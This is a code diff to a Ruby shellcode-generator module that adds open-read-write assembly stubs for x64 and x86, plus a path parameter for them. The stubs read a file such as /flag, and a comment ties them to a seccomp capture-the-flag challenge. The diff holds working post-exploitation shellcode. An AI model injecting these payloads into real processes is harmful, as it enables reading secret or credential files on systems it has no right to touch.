@@ -76,6 +76,61 @@ module AugureProfiler
           ASM
         ]
       },
+      orw: {
+        x64: [
+          <<~ASM
+            call readflag
+            path:
+              db "PATH_SLOT", 0
+            readflag:
+              pop rdi
+              push 2
+              pop rax
+              xor esi, esi
+              xor edx, edx
+              syscall
+              mov rdi, rax
+              sub rsp, 128
+              mov rsi, rsp
+              push 64
+              pop rdx
+              push 0
+              pop rax
+              syscall
+              mov rdx, rax
+              mov rsi, rsp
+              push 1
+              pop rdi
+              push 1
+              pop rax
+              syscall
+          ASM
+        ],
+        x86: [
+          <<~ASM
+            call readflag
+            path:
+              db "PATH_SLOT", 0
+            readflag:
+              pop ebx
+              xor ecx, ecx
+              xor edx, edx
+              mov eax, 5
+              int 80h
+              mov ebx, eax
+              sub esp, 128
+              mov ecx, esp
+              mov edx, 64
+              mov eax, 3
+              int 80h
+              mov edx, eax
+              mov ecx, esp
+              mov ebx, 1
+              mov eax, 4
+              int 80h
+          ASM
+        ]
+      },
       bash: {
         x64: [
           <<~ASM
@@ -120,11 +175,16 @@ module AugureProfiler
     }.freeze
 
     # klass: Metasm::X64 or Metasm::Ia32 (the target architecture).
+    # path: the parameter for the path-bearing stubs (sh/bash exec the
+    # path; orw reads it - the seccomp answer reads /flag, not a shell).
     # Returns the assembled bytes.
-    def self.generate(klass, stub = :sh, rng: nil)
+    def self.generate(klass, stub = :sh, path: nil, rng: nil)
       arch = (klass == Metasm::X64) ? :x64 : :x86
       variants = SOURCES.fetch(stub).fetch(arch)
       source = rng ? variants.sample(random: rng) : variants.first
+      source = source.gsub("PATH_SLOT", path.to_s) if path
+      raise ArgumentError, "this stub needs a path" if source.include?("PATH_SLOT")
+
       Metasm::Shellcode.assemble(klass.new, source).encode_string
     end
   end
